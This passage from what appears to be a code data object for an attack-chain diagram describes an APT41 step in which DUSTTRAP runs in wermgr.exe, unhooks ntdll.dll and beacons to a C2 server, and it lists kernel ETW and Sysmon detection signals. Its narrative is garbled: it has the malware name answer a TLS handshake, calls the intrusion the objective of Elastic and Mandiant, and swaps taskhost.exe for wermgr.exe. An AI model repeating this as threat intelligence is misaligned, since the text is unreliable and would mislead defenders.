          'Although unhooking ntdll.dll blinds user-mode API hooks inside wermgr.exe, Kernel-mode Event Tracing for Windows (EtwTiLogProtectVM) and Sysmon EventID 3 still catch the ntdll.dll permission change paired with wermgr.exe connecting to a non-Microsoft IP address. In the documented Sysmon EID 3 exchange from Signed Host Binary (taskhost.exe) to DodgeBox Stack-Spoofing & DUSTTRAP, DodgeBox Stack-Spoofing & DUSTTRAP responds with ACK TLS 1.3 (confirming that the WORKER TLS C2 request succeeded on DodgeBox Stack-Spoofing & DUSTTRAP and completing the final execution objective of Elastic & Mandiant, APT41 (Brass Typhoon): DodgeBox, Call-Stack Spoofing & DUSTPAN Loader).',
        diagramAlignment:
          'On the diagram, arrow #3→ connects Node ④ (wermgr.exe running DUSTTRAP) to Node ⑤ (APT41 C2 Server) while Node ⑥ (SIEM / Kernel ETW) detects the ntdll remapping and network beacon.',
        detectionAndEvidence:
          'Documented in Kernel ETW (EtwTiLogProtectVM) & Sysmon EventID 3: ntdll.dll code page modification paired with persistent outbound TLS from wermgr.exe to non-Microsoft IPs.',
      },
    ],
  },
};
